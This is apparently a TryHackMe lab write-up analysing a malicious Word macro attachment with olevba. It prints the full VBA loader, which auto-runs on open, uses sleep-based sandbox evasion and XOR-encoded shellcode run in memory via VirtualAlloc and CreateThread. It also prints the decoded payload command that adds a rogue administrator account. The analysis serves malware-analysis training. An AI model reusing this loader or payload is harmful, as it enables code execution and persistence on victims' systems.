

# Task-13 

 The goal is to investigate a suspicious email attachment 

**OLEVBA** is a tool from the oletools Python package that extracts and analyzes VBA macros from Office files

```bash
olevba --decode Project.docm --deobf
XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
olevba 0.60.2 on Python 3.12.3 - http://decalage.info/python/oletools
===============================================================================
FILE: Project.docm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function FlsAlloc Lib "kernel32" (ByVal lpCallback As LongPtr) As Long

Sub MyMacro()
Dim buf As Variant

  Dim tmp As LongPtr

  Dim addr As LongPtr

  Dim counter As Long

  Dim data As Long

  Dim res As Long

  Dim dream As Integer

  Dim before As Date

  If IsNull(FlsAlloc(tmp)) Then

    Exit Function

  End If

  dream = Int((1500 * Rnd) + 2000)

  before = Now()

  Sleep (dream)

  If DateDiff("s", t, Now()) < dream Then

    Exit Function

  End If

  buf = Array(144, 219, 177, 116, 108, 51, 83, 253, 137, 2, 243, 16, 231, 99, 3, 255, 62, 63, 184, 38, 120, 184, 65, 92, 99, 132, 121, 82, 93, 204, 159, 72, 13, 79, 49, 88, 76, 242, 252, 121, 109, 244, 209, 134, 62, 100, 184, 38, 124, 184, 121, 72, 231, 127, 34, 12, 143, 123, 50, 165, 61, 184, 106, 84, 109, 224, 184, 61, 116, 208, 9, 61, 231, 7, 184, 117, 186, 2, 204, 216, 173, _
252, 62, 117, 171, 11, 211, 1, 154, 48, 78, 140, 87, 78, 23, 1, 136, 107, 184, 44, 72, 50, 224, 18, 231, 63, 120, 255, 52, 47, 50, 167, 231, 55, 184, 117, 188, 186, 119, 80, 72, 104, 104, 21, 53, 105, 98, 139, 140, 108, 108, 46, 231, 33, 216, 249, 49, 89, 50, 249, 233, 129, 51, 116, 108, 99, 91, 69, 231, 92, 180, 139, 185, 136, 211, 105, 70, 57, 91, 210, 249, _
142, 174, 139, 185, 15, 53, 8, 102, 179, 200, 148, 25, 54, 136, 51, 127, 65, 92, 30, 108, 96, 204, 161, 2, 86, 71, 84, 25, 64, 86, 6, 76, 82, 87, 25, 5, 93, 90, 7, 24, 65, 65, 21, 24, 92, 65, 84, 58, 118, 91, 58, 9, 3, 101, 70, 33, 100, 75, 18, 56, 102, 113, 48, 15, 89, 113, 77, 76, 28, 82, 16, 8, 19, 28, 45, 76, 21, 19, 26, 9, _
71, 19, 24, 3, 80, 82, 24, 11, 65, 92, 1, 28, 19, 82, 16, 1, 90, 93, 29, 31, 71, 65, 21, 24, 92, 65, 7, 76, 82, 87, 25, 5, 93, 90, 7, 24, 65, 65, 21, 24, 92, 65, 84, 67, 82, 87, 16, 108)

  For i = 0 To UBound(buf)

    buf(i) = buf(i) Xor Asc("l33t")

  Next i

  addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

  For counter = LBound(buf) To UBound(buf)

    data = buf(counter)
    res = RtlMoveMemory(addr + counter, data, 1)

  Next counter

  res = CreateThread(0, 0, addr, 0, 0, 0)

End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|CreateThread        |May inject code into another process         |
|Suspicious|VirtualAlloc        |May inject code into another process         |
|Suspicious|RtlMoveMemory       |May inject code into another process         |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA obfuscated      |VBA string expressions were detected, may be |
|          |Strings             |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |'}'               |l33t                                         |
|String    |                    |                                             |
|VBA string|b'\x97}\xed'        |Asc("l33t")                                  |
+----------+--------------------+---------------------------------------------+

ubuntu@tryhackme:~/Task-13$ 
```
The buf variable contains XOR-encoded shellcode that, when executed, runs malicious code directly in memory (fileless attack)

```python
buf = [144, 219, 177, 116, 108, 51, 83, 253, 137, 2, 243, 16, 231, 99, 3, 255, 62, 63, 184, 38, 120, 184, 65, 92, 99, 132, 121, 82, 93, 204, 159, 72, 13, 79, 49, 88, 76, 242, 252, 121, 109, 244, 209, 134, 62, 100, 184, 38, 124, 184, 121, 72, 231, 127, 34, 12, 143, 123, 50, 165, 61, 184, 106, 84, 109, 224, 184, 61, 116, 208, 9, 61, 231, 7, 184, 117, 186, 2, 204, 216, 173, 252, 62, 117, 171, 11, 211, 1, 154, 48, 78, 140, 87, 78, 23, 1, 136, 107, 184, 44, 72, 50, 224, 18, 231, 63, 120, 255, 52, 47, 50, 167, 231, 55, 184, 117, 188, 186, 119, 80, 72, 104, 104, 21, 53, 105, 98, 139, 140, 108, 108, 46, 231, 33, 216, 249, 49, 89, 50, 249, 233, 129, 51, 116, 108, 99, 91, 69, 231, 92, 180, 139, 185, 136, 211, 105, 70, 57, 91, 210, 249, 142, 174, 139, 185, 15, 53, 8, 102, 179, 200, 148, 25, 54, 136, 51, 127, 65, 92, 30, 108, 96, 204, 161, 2, 86, 71, 84, 25, 64, 86, 6, 76, 82, 87, 25, 5, 93, 90, 7, 24, 65, 65, 21, 24, 92, 65, 84, 58, 118, 91, 58, 9, 3, 101, 70, 33, 100, 75, 18, 56, 102, 113, 48, 15, 89, 113, 77, 76, 28, 82, 16, 8, 19, 28, 45, 76, 21, 19, 26, 9, 71, 19, 24, 3, 80, 82, 24, 11, 65, 92, 1, 28, 19, 82, 16, 1, 90, 93, 29, 31, 71, 65, 21, 24, 92, 65, 7, 76, 82, 87, 25, 5, 93, 90, 7, 24, 65, 65, 21, 24, 92, 65, 84, 67, 82, 87, 16, 108]  

key = b"l33t"
decoded = bytearray()

for i, b in enumerate(buf):

    decoded.append(b ^ key[i % len(key)])
with open("decoded_shellcode.bin", "wb") as f:

    f.write(decoded)
```

```bash
ubuntu@tryhackme:~$ sudo strings decoded_shellcode.bin 
;}$u

D$$[[aYZQ

net user administrrator VEhNe0V2MWxfTUBDcjB9 /add /Y & net localgroup administrators administrrator /add

ubuntu@tryhackme:~$ file decoded_shellcode.bin 

decoded_shellcode.bin: data

ubuntu@tryhackme:~$ echo "VEhNe0V2MWxfTUBDcjB9" | base64 -d

THM{Ev1l_M@Cr0}ubuntu@tryhackme:~$ 

```
